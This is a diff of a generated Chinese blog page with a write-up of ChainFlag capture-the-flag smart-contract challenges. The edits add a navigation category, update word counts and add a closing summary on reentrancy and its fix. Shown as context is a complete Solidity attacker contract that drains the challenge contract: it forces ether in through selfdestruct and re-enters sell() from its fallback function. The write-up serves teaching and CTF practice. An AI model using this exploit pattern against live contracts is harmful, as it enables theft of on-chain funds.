@@ -1794,7 +1794,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1694063332537),
+    lastupdate: new Date(1696680122707),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
       for_post: ["toc","blogger","qrcode"],
@@ -2443,6 +2443,23 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
           
                     
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/categories/Foundry/" title="Foundry"
+                  
+                  
+                  
+                    active-action="action-categoriesFoundry"
+                  >
+                  <i class='fa-solid fa-book fa-fw'></i>Foundry
+                </a>
+                
+              </li>
+            
+          
+                    
                   </ul>
                 
               </li>
@@ -2750,6 +2767,23 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
           
                     
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/categories/Foundry/" title="Foundry"
+                  
+                  
+                  
+                    active-action="action-categoriesFoundry"
+                  >
+                  <i class='fa-solid fa-book fa-fw'></i>Foundry
+                </a>
+                
+              </li>
+            
+          
+                    
                   </ul>
                 
               </li>
@@ -2995,13 +3029,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：1.6k 字</p>
+      <p>字数：1.7k 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fa-solid fa-bell fa-fw" aria-hidden="true"></i>
-      <p>时长：8 分钟</p>
+      <p>时长：9 分钟</p>
     </a>
   </div>
 
@@ -3090,6 +3124,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line"></span><br><span class="line">    challenge challenge_;</span><br><span class="line">    bool flag;</span><br><span class="line"></span><br><span class="line">    constructor(address _challenge) public payable &#123;</span><br><span class="line">        require(msg.value == 200 wei);</span><br><span class="line">        challenge_ = challenge(_challenge);</span><br><span class="line">        (new Helper).value(200 wei)(_challenge);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value == 1 wei);</span><br><span class="line">        challenge_.buy.value(1 wei)();</span><br><span class="line">        for (uint i; i &lt; 8; i++) &#123;</span><br><span class="line">            challenge_.transfer(address(this), challenge_.balanceOf(address(this)));</span><br><span class="line">        &#125;</span><br><span class="line">        challenge_.sell(100);</span><br><span class="line">        require(challenge_.winnerSubmit(), &quot;you are not winner&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() external payable&#123;</span><br><span class="line">        if (!flag) &#123;</span><br><span class="line">            flag = true;</span><br><span class="line">            challenge_.sell(100);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Helper &#123;</span><br><span class="line">    </span><br><span class="line">    constructor(address _challenge) public payable &#123;</span><br><span class="line">        selfdestruct(_challenge);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2023/08/26/Smart%20contracts/ChainFlag/reentrancy/reentrancy(2)/image-20230826150110196.png" alt="image-20230826150110196"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里考查的是重入，emmm，怎么说呢，重入最明显的一个特点就是：钱的更新在转账操作之后，这样一来hacker可以在回调函数中执行恶意操作，因为钱还没改变就可以一直通过转账前的判断条件，从而实现任意次的调用，最简单的改进方法就是，先更新钱再执行转账。</p>
 
   </div>
   
@@ -3192,7 +3227,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2023/08/26/Smart%20contracts/ChainFlag/public%20blockchain/public_blockchain(2)/'>
           <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>public_blockchain(2)❌</p>
-          <p class='content'>emmm，找不到题目。。。。</p>
+          <p class='content'>这不是solidity，就不参合了🤪</p>
         </a>
       
       
@@ -3360,7 +3395,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babybank"><span class="toc-text">babybank</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-question"><span class="toc-text">1. question</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-analysis"><span class="toc-text">2.analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-solve"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#h4ck"><span class="toc-text">h4ck</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-question-1"><span class="toc-text">1. question</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-analysis-1"><span class="toc-text">2.analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-solve-1"><span class="toc-text">3. solve</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babybank"><span class="toc-text">babybank</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-question"><span class="toc-text">1. question</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-analysis"><span class="toc-text">2.analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-solve"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#h4ck"><span class="toc-text">h4ck</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-question-1"><span class="toc-text">1. question</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-analysis-1"><span class="toc-text">2.analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-solve-1"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
     </div>
   </section>
 
